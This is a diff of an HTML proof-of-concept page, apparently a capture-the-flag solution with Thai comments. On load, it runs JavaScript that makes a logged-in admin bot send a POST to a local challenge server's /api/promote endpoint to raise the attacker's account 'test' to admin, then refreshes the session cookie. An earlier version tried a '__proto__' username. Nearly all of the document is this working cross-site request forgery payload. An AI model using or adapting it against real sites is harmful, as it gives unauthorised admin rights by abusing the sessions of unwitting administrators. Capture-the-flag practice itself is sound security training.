@@ -1,32 +1,40 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Exploit POC</title>
 </head>
+
 <body>
-    <h1>Loading...</h1>
+    <h1>Exploit Running...</h1>
     <script>
-        // ตัวอย่าง Payload สำหรับสั่งให้บอท (ที่ล็อกอินเป็น admin อยู่แล้ว) ทำการเรียก API
         async function pwn() {
-            // สมมติเป้าหมายรันอยู่ที่ URL ของโจทย์ (เปลี่ยน IP และ Port ตามจริง)
-            const targetBase = "http://127.0.0.1:56366/"; 
+            // สำคัญมาก: เปลี่ยนเป็น URL ของเว็บโจทย์ที่คุณได้มาจากตัวรัน (เช่น http://127.0.0.1:56366 หรือ IP ที่เซิร์ฟเวอร์เปิดไว้)
+            const targetBase = "http://127.0.0.1:52732/";
 
-            // 1. ส่งคำขอ Promote ตัวเอง (หรือบัญชีที่เราสมัครไว้) ให้เป็น admin หรือใช้ช่องโหว่
-            await fetch(targetBase + "/api/promote", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    user: "__proto__", // หรือใช้ชื่อผู้ใช้ที่เราสมัครไว้
-                    role: "admin" // หรือใช้ค่าอื่นตามช่องโหว่ที่เจาะได้
-                })
-            });
+            try {
+                // 1. สั่งให้ Admin บอทช่วยโปรโมตยูสเซอร์ของคุณ (เช่น ยูสเซอร์ "test") ให้เป็น admin
+                const res = await fetch(targetBase + "/api/promote", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        user: "test",       // ชื่อยูสเซอร์ที่คุณสมัครไว้บนเว็บโจทย์
+                        role: "admin"       // ให้แอดมินเปลี่ยนเป็น admin ให้
+                    })
+                });
+                const data = await res.json();
+                console.log("Promote result:", data);
 
-            // 2. เรียก refresh-cookie เพื่อบังคับอัปเดตสิทธิ์ในเซสชันของบอทหรือเซิร์ฟเวอร์
-            await fetch(targetBase + "/refresh-cookie", {
-                method: "GET"
-            });
+                // 2. สั่งรีเซ็ตคุกกี้เพื่อให้เซสชันอัปเดตสิทธิ์ใหม่
+                await fetch(targetBase + "/refresh-cookie", {
+                    method: "GET"
+                });
+            } catch (e) {
+                console.error("Error:", e);
+            }
         }
         pwn();
     </script>
 </body>
+
 </html>
